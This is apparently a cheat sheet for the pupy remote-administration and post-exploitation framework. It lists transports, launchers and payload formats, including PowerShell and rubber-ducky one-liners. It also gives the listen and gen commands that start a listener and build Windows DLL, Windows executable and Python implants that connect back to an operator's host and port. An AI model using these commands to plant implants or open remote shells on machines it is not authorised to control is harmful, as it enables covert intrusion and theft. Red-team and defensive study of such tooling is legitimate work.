## Run the server
Once you have [correctly](https://github.com/n1nj4sec/pupy/wiki/Installation) installed pupy, you are ready to launch the server.
```code
pupysh
```

## Transport
-
```ssl```

-
```rsa```

-
```ssl_rsa```

-
```websocket```

-
```aes```

-
```http```

-
```obfs3```

-
```scramblesuit```

-
```udp```

## Launchers
-
```connect```

-
```bind```

-
```auto_proxy```

-
```dnscnc```

## Listeners
To add listeners on `pupysh`, use `listen` as following:
```
>> listen -a <transport> <port>
```

- Exemple:
```
>> listen -a ssl 8443
[+] Listen: ssl: 8443
```

## Payloads format
-
```client```

-
```py```

-
```pyinst```

-
```py_oneliner```

-
```ps1```

-
```ps1_oneliner```

-
```rubber_ducky```

## Payloads Generation
Payloads generation are done using the `gen` command.
```
>> gen -f <format> <launcher> -t <transport>
```

- Windows dll
```
>> gen -S -f client -O windows -A x64 connect --host ip:port -t transport
```

- Windows executable
```
>> gen -f client -O windows -A x64 connect --host ip:port -t transport
```

- Python file - Bind
```
>> gen -f py bind --port port -t transport
```

- Python oneliner
```
>> gen -f py_oneliner connect --host ip:port -t transport
```

